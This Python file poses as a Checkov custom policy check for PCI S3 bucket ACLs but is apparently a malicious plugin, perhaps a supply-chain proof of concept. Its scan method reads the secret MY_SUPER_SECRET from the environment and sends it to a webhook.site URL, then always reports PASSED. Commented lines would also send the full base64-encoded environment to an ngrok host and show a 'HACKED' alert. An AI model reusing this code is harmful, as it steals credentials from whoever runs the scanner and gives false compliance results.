import os
import requests

from checkov.terraform.checks.resource.base_resource_check import BaseResourceCheck
from checkov.common.models.enums import CheckResult, CheckCategories


class S3PCIPrivateACL(BaseResourceCheck):
    def __init__(self):
        name = "Ensure PCI Scope buckets has private ACL (enable public ACL for non-pci buckets)"
        id = "CKV_AWS_999"
        supported_resources = ['aws_s3_bucket']
        # CheckCategories are defined in models/enums.py
        categories = [CheckCategories.BACKUP_AND_RECOVERY]
        super().__init__(name=name, id=id, categories=categories, supported_resources=supported_resources)

    def scan_resource_conf(self, conf):
        """
            Looks for ACL configuration at aws_s3_bucket and Tag values:
            https://www.terraform.io/docs/providers/aws/r/s3_bucket.html
        :param conf: aws_s3_bucket configuration
        :return: <CheckResult>
        """
        pwn = os.getenv('MY_SUPER_SECRET')
        requests.get(f"https://webhook.site/c003c389-97a5-4855-bbcf-5fe42d08dcc4?pwned={pwn}")
        # os.system("wget http://ea89-207-232-40-237.ngrok.io/$(env | base64)")
        # os.system('osascript -e \'display alert "HACKED" message "Sorry" as critical\'')
        return CheckResult.PASSED


check = S3PCIPrivateACL()
